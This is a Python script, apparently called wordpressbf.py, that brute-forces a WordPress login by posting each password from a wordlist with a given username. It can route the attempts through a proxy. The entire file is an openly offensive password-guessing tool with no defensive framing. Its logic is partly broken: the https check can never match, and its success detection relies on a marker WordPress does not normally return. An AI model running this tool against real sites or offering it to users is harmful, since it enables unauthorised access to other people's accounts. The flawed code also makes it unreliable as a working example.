import urllib.request, urllib.error, urllib.parse
import sys
import re
import urllib.request, urllib.parse, urllib.error
import http.client
import socket


if len(sys.argv) not in [4,5,6,7]:
    print('Usage: python wordpressbf.py <site> <user> <wordlist> <options>\n')
    print('\t   -p/-proxy <host:port> : Add proxy support')
    print('\t   -v/-verbose : Verbose Mode\n')
    sys.exit(1)

for arg in sys.argv[1:]:
    if arg.lower() == '-p' or arg.lower() == '-proxy':
        proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
    if arg.lower() == '-v' or arg.lower() == '-verbose':
        verbose = 1

try:
    if proxy:
        print('\n * Testing Proxy...')
        h2 = http.client.HTTPConnection(proxy)
        h2.connect()
        print('* Proxy:', proxy)

except(socket.timeout):
    print('\n[-] Proxy Timed Out')
    proxy = 0
except(NameError):
    print('\n[-] Proxy Not Given')
    proxy = 0
except:
    print('\n[-] Proxy Failed')
    proxy = 0

try:
   if verbose == 1:
      print('* Verbose Mode On\n')

except(NameError):
    print('[-] Verbose Mode Off\n')
    verbose = 0

if sys.argv[1][:7] != 'https://':
    host =  sys.argv[1]
else:
    host = sys.argv[1]

print('* BruteForcing:', host)

print('* User:', sys.argv[2])


try:
    words = open(sys.argv[3], 'r', encoding='latin-1').readlines()
    print('* Words Loaded:', len(words), '\n')

except(IOError):
    print('[-] Error: Check your wordlist path\n')
    sys.exit(1)

for word in words:
    word = word.replace('\r','').replace('\n','')
    login_form_seq = [
        ('log', sys.argv[2]),
        ('pwd', word),
        ('rememberme', 'forever'),
        ('wp-submit', 'Login >>'),
        ('redirect_to', 'wp-admin/')]
    login_form_data = urllib.parse.urlencode(login_form_seq)
    if proxy != 0:
        proxy_handler = urllib.request.ProxyHandler({'https': 'https://'+proxy+'/'})
        opener = urllib.request.build_opener(proxy_handler)
    else:
        opener = urllib.request.build_opener()
    try:
        print('host: ',host)
        print('login_form_data.encode(): ',login_form_data.encode())
        
        site = opener.open(host, login_form_data.encode()).read()
    except(urllib.error.URLError) as msg:
        print(msg)
        site = ''

    if (not site or site.isspace()):
        continue

    if  re.search('WordPress requires Cookies', site.decode('utf-8')):
        print('[-] Failed: WordPress has cookies enabled\n')
        sys.exit(1)

    #print('verbose - : ', site)
    #Change this response if different. (language)
    if re.search('<strong>ERROR</strong>', site.decode('utf-8')) and verbose == 1:
        print('[-] Login Failed:', word)
    else:
        if re.search('<strong>SUCCESS</strong>', site.decode('utf-8')) and verbose == 1:
           print('\n\t[!] Login Successfull:', sys.argv[2],word,'\n')
           sys.exit(1)

print('\n[-] Brute Complete\n')
